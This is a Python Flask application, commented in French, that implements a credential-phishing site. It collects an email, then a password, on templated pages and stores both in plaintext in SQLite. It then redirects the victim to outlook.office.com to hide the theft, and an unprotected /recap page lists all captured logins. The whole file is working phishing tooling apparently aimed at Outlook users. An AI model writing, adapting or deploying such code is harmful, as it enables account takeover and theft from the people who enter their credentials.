from flask import Flask, request, render_template, redirect, session
import sqlite3
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = "ceci_est_une_clé_secrète_à_modifier"
DB_FILE = "data.db"

# Initialisation de la base SQLite
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("""
            CREATE TABLE IF NOT EXISTS logins (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                email TEXT,
                password TEXT
            )
        """)
        conn.commit()

@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def step1():
    email = request.form.get("email")
    timestamp = datetime.now().isoformat(timespec='seconds')

    session["email"] = email
    session["timestamp"] = timestamp

    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("INSERT INTO logins (timestamp, email, password) VALUES (?, ?, ?)", (timestamp, email, ""))
        conn.commit()

    return render_template("password.html", email=email)

@app.route("/final", methods=["POST"])
def step2():
    email = session.get("email", "non_renseigné")
    timestamp = session.get("timestamp")
    password = request.form.get("password")

    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("UPDATE logins SET password = ? WHERE timestamp = ? AND email = ? AND password = ''", (password, timestamp, email))
        conn.commit()

    session.clear()
    return redirect("https://outlook.office.com")

@app.route("/recap", methods=["GET"])
def recap():
    rows = []
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("SELECT timestamp, email, password FROM logins")
        rows = c.fetchall()

    table_html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th></tr>"
    for row in rows:
        table_html += "<tr>" + "".join(f"<td>{cell}</td>" for cell in row) + "</tr>"
    table_html += "</table>"
    return table_html

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000)
